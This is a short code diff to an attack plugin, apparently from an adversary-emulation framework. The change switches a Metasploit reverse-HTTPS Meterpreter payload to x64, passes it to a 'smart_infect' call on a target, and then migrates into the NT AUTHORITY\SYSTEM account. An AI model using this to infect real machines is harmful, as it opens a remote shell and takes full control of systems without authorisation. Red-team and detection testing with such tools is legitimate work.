@@ -27,7 +27,7 @@ class MetasploitScreengrabPlugin(AttackPlugin):
         """
 
         res = ""
-        payload_type = "windows/meterpreter_reverse_https"
+        payload_type = "windows/x64/meterpreter/reverse_https"
         payload_name = "babymetal.exe"
         target = self.targets[0]
 
@@ -36,7 +36,10 @@ class MetasploitScreengrabPlugin(AttackPlugin):
                                        attacker=self.attacker_machine_plugin,
                                        username=self.metasploit_user)
 
-        metasploit.smart_infect(target, payload_type, payload_name, )
+        metasploit.smart_infect(target,
+                                payload=payload_type,
+                                payload_name=payload_name,
+                                architecture="x64")
 
         metasploit.migrate(target, user="NT AUTHORITY\\SYSTEM")
 
